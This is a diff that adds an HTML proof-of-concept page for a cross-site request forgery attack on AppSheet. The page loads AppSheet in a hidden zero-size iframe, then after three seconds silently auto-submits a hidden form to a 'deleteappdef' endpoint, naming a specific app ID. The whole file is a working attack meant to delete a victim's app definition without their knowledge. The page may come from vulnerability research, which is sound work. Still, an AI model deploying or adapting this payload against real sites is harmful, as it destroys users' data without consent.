@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CSRF Chain Demo - Option B</title>
+  </head>
+  <body>
+    <h2>Visiting AppSheet in iframe then attempting CSRF</h2>
+
+    <!-- Step 1: Load AppSheet (same-site condition) -->
+    <iframe src="https://www.appsheet.com/" style="width:0; height:0; border:0; visibility:hidden;"></iframe>
+
+    <!-- Step 2: Run CSRF -->
+    <form id="csrfForm" action="https://www.appsheet.com/template/deleteappdef" method="POST">
+      <input type="hidden" name="appId" value="075ef5d4-78d3-41b-ab97-29d5c33214a9" />
+    </form>
+
+    <script>
+      setTimeout(() => {
+        document.getElementById('csrfForm').submit();
+      }, 3000); // Wait a bit after iframe load
+    </script>
+  </body>
+</html>
